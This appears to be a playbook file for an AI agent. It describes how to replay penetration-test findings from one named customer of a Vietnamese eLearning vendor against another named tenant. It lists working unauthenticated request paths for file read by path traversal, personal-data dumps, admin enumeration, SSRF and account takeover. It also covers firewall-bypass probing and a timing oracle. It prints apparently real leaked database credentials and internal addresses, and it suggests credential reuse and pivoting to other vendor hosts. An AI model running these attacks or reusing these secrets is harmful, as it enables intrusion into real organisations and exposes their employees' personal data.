# Same-Vendor LMS Replay — Trinam/DTTT eLearning Platform (field-proven 2026-09)

Class of task: you hold a pentest report for ONE deployment of a vendor product
(ilearn.seabank.com.vn) and replay the findings against ANOTHER tenant of the same
vendor (lms.evnhanoi.vn). Vendor platforms ship the same bugs to every customer;
what differs per tenant: WAF posture, removed endpoints, and API path prefix.

## 1. Platform fingerprint (Trinam/DTTT eLearning, .NET Core 2.1 microservices)

- Angular SPA; microservices behind reverse-proxy paths: `<tenant>.<svc>.api/api/v1/...`
  SeaBank: `seabank.hr.api`; EVN: `evn.hr.api`. Prefix = tenant token, guessable.
- Services: authentication (IdentityServer4, `/connect/token` password grant, client_id=web),
  authorization, hr, lms, file, portal, notification, caching, log, navigation, dashboard,
  test, localization, settings, news, hrms, danhmuc, thumbor.
- ONLYOFFICE DocumentServer proxied at `/documentserver/*` (often on a separate
  vendor host, e.g. document.dttt.vn).
- `/assets/sso.html` — postMessage handler with NO origin check (set/clear localStorage).
- SignalR hubs: `/<prefix>.notification.api/socket/hubs/notification`, `.../lrs`, `.../test`.

## 2. Fast replay procedure (≈15 min)

1. Fetch SPA index.html → get exact `main.<hash>.bundle.js` → download (~3MB).
2. Extract the service map + endpoints:
   `grep -oE "[a-z0-9]+\.api/[a-z]+" main.js | sort -u`   (prefix + service list)
   `grep -oE "svUrl\+\"[^\"]+\"" main.js | sort -u`        (real controller/action routes)
3. Decode the JWT you already have — free recon:
   - `aud` claim lists every scope/service the platform runs (Audience, Authorization, Hr,
     LMS, Localization, Log, Navigation, Notification, Test → the microservice inventory).
   - `userid`, `sessionid`, `userType`, `isSuperUser`-adjacent claims feed IDOR tests.
4. Replay each report finding with the tenant prefix swapped; log CONFIRMED / FIXED / WAF-BLOCKED
   per finding. On EVN: 5/8 confirmed (traversal, PII unauth, admin enum, SignalR CORS, sso.html);
   register endpoint + IDOR update endpoints = 404 (removed), SSRF = WAF-blocked.

## 3. Core findings matrix (per tenant, retest all)

| Finding | Endpoint (unauthenticated unless noted) |
|---|---|
| Path traversal / arbitrary file read | `GET /<t>.file.api/api/v1/upload?file=/app/<path>` (yes, GET on "upload") |
| PII dump by GUID | `/<t>.hr.api/api/v1/HrProfile/GetByUserIdNoAuthen?userId=<guid>` |
| Profile by username (auth) | `/<t>.hr.api/api/v1/HrProfile/GetByUsername?username=admin` → isSuperUser, vendor email |
| Unauth register (SeaBank only) | `/<t>.hr.api/api/v1/HrProfileRegister/RegisterAccount` → then `/connect/token` |
| IDOR update → ATO (SeaBank only) | `/<t>.hr.api/api/v1/HrProfile/updatePrivateProfile` |
| SSRF | `/documentserver/ConvertService.ashx` (url param), `/<t>.thumbor.api/unsafe/smart///<host>/...` |
| SignalR CORS *+credentials | `/<t>.notification.api/socket/hubs/*/negotiate` OPTIONS with evil Origin |
| postMessage no origin check | `/assets/sso.html` |

## 4. Traversal specifics on this platform

- Readable root = container `/app` (ASP.NET Core app dir). `appsettings.Development.json`
  ships to prod because `web.config` sets `ASPNETCORE_ENVIRONMENT=Development` — read
  `/app/web.config` FIRST to learn which appsettings variant exists.
- Yield: MSSQL creds (serviceadmin1/Trinam@123 @10.0.68.38), Redis (192.168.2.191:6379),
  internal gateway `elearningevn1.local:30000`, configserver:8899, rabbitmq, mongo.
- Vendor-tenant pivot: internal names + admin email `test@trinam.vn` reveal the vendor
  (Trinam/DTTT) → password-reuse and shared-infra follow-ups (viettel-api.dttt.vn,
  document.dttt.vn run the same eLearning stack).
- Binary files (dll/pdb) return 200 with 0 bytes — JSON wrapper only serves text.

## 5. WAF posture differs per tenant (F5 ASM on EVN, none/loose on SeaBank)

- EVN sits behind F5 ASM (cookies `TS01331815`, `TS...`): blocks `etc/passwd` string,
  the WORDS `UpdateUserInfo` / `ConvertService` anywhere in the URL (even GET, even empty
  body), POST to `/upload`, and every thumbor URL containing a hostname.
- Block signature: HTTP 200 + 247-byte `Request Rejected ... support ID` HTML.
- `....//` bypasses the WAF signature but the app normalizes → signature-only bypass,
  no traversal gain. JSON `\uXXXX` escapes and chunked TE do NOT bypass.
- Thumbor timing oracle: external host ~5s to block, internal `.local` ~20s (DNS wait)
  — distinguishes DNS-fail from WAF-block when both return the same page.
- See waf-bypass-techniques skill for the general playbook; here the WAF won —
  report the server-side vuln as WAF-shadowed, not absent (same code as SeaBank).

## 6. Report shape the user wants

One line per confirmed finding with severity, the exact request, and the leaked artifact;
then a short "fixed vs SeaBank" list and next-step recommendation (e.g. cred reuse from
another network vantage, since MSSQL/Redis are internal-only).
